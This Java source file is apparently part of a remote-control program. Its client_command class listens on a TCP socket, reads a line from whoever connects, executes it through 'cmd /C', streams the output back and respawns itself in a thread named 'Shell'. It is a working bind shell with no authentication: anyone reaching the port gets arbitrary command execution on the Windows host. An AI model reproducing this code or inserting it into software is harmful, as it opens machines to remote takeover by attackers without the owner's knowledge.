/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package command;

import Comman.KeysVer;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import networksockets.SocketConnect;

/**
 *
 * @author abaza
 */
public class client_command implements Runnable {

    private Socket client = null;
    private SocketConnect SC = null;

    public void start() {
        SC = new SocketConnect();
    }

    private void init() {
        try {
            if (SC != null) {
                if (SC.init(KeysVer.Socket_Type.TCP)) {
                    ServerSocket server = SC.GetServerSocet();
                    this.client = server.accept();
                }
            }
        } catch (IOException ex) {
        }
    }

    @Override
    public void run() {
        init();
        BufferedInputStream in = null;
        BufferedInputStream procStdout = null;
        BufferedOutputStream out = null;
        StringBuffer cmd = null;
        Process proc = null;

        try {
            in = new BufferedInputStream(client.getInputStream());
            cmd = new StringBuffer();
            int c = -1;
            while ((c = in.read()) != -1) {
                cmd.append((char) c);
                if (c == (int) '\n') {
                    break;
                }
            }
        } catch (Exception e) {
            return;
        }
        try {
            /*
             * Start the process
             */
            proc = Runtime.getRuntime().exec("cmd /C " + cmd.toString());
            procStdout = new BufferedInputStream(proc.getInputStream());
            out = new BufferedOutputStream(client.getOutputStream());
            int c = -1;
            while ((c = procStdout.read()) != -1) {
                out.write(c);
            }
            out.flush();
            out.close();
            procStdout.close();
        } catch (Exception e) {
            try {
                out.write("nothing".getBytes());
                out.flush();
                out.close();
            } catch (IOException ex) {
            }
        }
        try {
            in.close();
        } catch (Exception e) {
        }
        new Thread(this, "Shell").start();
    }

    public void End() {
        try {
            SC = null;
            if (client != null) {
                client.close();
                client = null;
            }
        } catch (IOException ex) {
        }
    }
}
